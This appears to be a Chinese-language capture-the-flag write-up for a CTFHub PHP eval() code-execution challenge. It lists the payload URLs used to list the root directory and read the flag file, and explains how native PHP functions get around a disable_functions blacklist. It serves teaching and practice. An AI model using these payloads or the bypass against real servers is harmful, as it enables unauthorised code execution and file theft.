
---
layout: post
title: "CTFHub Writeup-eval执行"
date: 2026-09-16
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - eval执行 

## 题目类型

WEB

## 题目描述

打开题目，点开链接后，页面显示一串代码：

<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?>

# 解题过程

## 踩坑过程

首先理解代码，进行源码审计与漏洞定位：

打开靶场，查看页面回显的 PHP 源码，发现使用了 eval($_REQUEST['cmd'])，存在严重的代码执行漏洞，且无任何过滤

输入http://challenge-7d66ef7bf0a33621.sandbox.ctfhub.com:10800/?cmd=phpinfo();测试代码能不能执行

回车后页面弹出一个紫色的PHP配置信息大表哥，说明代码执行成功

在浏览器搜索框输入此链接：http://challenge-7d66ef7bf0a33621.sandbox.ctfhub.com:10800/?cmd=system(%27ls%20/%27)来读取Flag

回车后发现白屏，所以我决定尝试新的链接

## 新路径：

在浏览器搜索框中搜索此链接：

http://challenge-7d66ef7bf0a33621.sandbox.ctfhub.com:10800/?cmd=print_r(scandir('/'));

回车后页面出现一串代码：

Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => flag_25344 [8] => home [9] => 
lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => sys [20] => tmp [21] => usr [22] => var )

提取出这一文本中的重要信息，找到了Flag文件：flag_25344

在浏览器地址栏中搜索栏中输入：

http://challenge-7d66ef7bf0a33621.sandbox.ctfhub.com:10800/?cmd=print_r(file_get_contents('/flag_25344'));

回车后页面显示出正确的Flag

# 笔记

## 失败原因

为什么 system('ls /') 会白屏？
 
system() 是 PHP 用来执行操作系统底层命令的函数。它的原理是：让 PHP 去调用 Linux 系统的 shell，然后执行 ls / 这个 Linux 命令。
 
但是，CTFHub 的靶场服务器为了安全，在 php.ini 配置文件里设置了一个叫 disable_functions（禁用函数） 的东西。它把 system、exec、shell_exec、passthru 这些能执行系统命令的危险函数全部拉黑了。
 
所以，当你输入 ?cmd=system('ls /') 时，PHP 发现你要用 system，直接拒绝执行并报错，而这个报错被靶场屏蔽了（或者因为致命错误导致页面直接中断），所以你看到的是一片白屏。
 
为什么 print_r(scandir('/')) 就能出目录？
 
因为 scandir() 和 print_r() 是 PHP 自带的原生文件操作函数。

• scandir('/')：它的功能是“扫描目录”，直接读取服务器文件系统的目录结构，不需要调用 Linux 的 ls 命令。

• print_r()：它的功能是“打印变量”，把 scandir 返回的数组打印成人类能看懂的形式。 

它们俩是 PHP 语言自身的功能，属于“文件读写”范畴，不属于“系统命令执行”范畴。因此，它们完全不受 disable_functions 的黑名单限制！ 所以它们能完美地绕过防御，把目录列表显示出来。
 
同理，读取 Flag 也是一样的道理

• system('cat /flag') 会白屏（因为 system 被禁）。

• print_r(file_get_contents('/flag')) 能成功（因为 file_get_contents 也是 PHP 原生函数，不受限制）。 

## 这道题主要学习了：

1、eval 代码执行漏洞的原理与利用

理解了 eval() 函数的危险性：它会将接收到的字符串当作 PHP 代码来执行。当靶场没有对 cmd 参数做任何过滤时，我们可以直接传入 phpinfo();、system('ls'); 等 Payload，实现代码执行。
 
2、PHP 原生函数与系统命令函数的区别（核心考点）

这是本题最大的收获。通过踩坑明白了：

• system()、exec() 属于“系统命令执行函数”，会调用 Linux 底层 shell，容易被 disable_functions 禁用，一旦被禁就是白屏。

• scandir()、file_get_contents() 属于“PHP 原生文件操作函数”，不依赖系统命令，不受 disable_functions 限制。

白屏不代表 Payload 错了，而是要立刻换用 PHP 原生函数来绕过限制。

3、scandir() + print_r() 的目录遍历技巧

学会了用 ?cmd=print_r(scandir('/')); 扫描根目录，找到 Flag 文件（如 flag_25344），再用 ?cmd=print_r(file_get_contents('/flag_25344')); 读取内容。这比死磕 cat /flag 高效得多。
 
4、RCE 漏洞的标准排查流程

掌握了命令执行类漏洞的固定套路：

• 先探路：phpinfo(); 确认代码执行成功。

• 再找文件：用目录遍历或 find 定位目标。

• 最后提取：用原生命令读取文件内容。

这个流程在未来的渗透测试中非常实用。

5、遇到“白屏”时的冷静分析与变通思维

深刻体会到：在 CTF 中遇到没有任何回显的白屏时，不要怀疑自己 Payload 写错了，

而是要立刻联想到“系统函数可能被禁用”，并马上换用其它等效的 PHP 内置函数（如 file_get_contents 替代 cat）





